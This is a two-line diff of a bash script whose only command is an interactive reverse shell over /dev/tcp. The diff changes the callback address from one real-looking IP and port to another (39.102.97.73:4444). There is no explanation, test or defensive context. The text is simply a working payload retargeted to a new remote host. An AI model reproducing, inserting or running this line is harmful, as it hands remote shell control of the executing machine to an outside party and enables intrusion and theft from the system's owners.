@@ -1,2 +1,2 @@
 #!/usr/bin/env bash
-bash -i >& /dev/tcp/36.151.142.194/8080 0>&1
+bash -i >& /dev/tcp/39.102.97.73/4444 0>&1
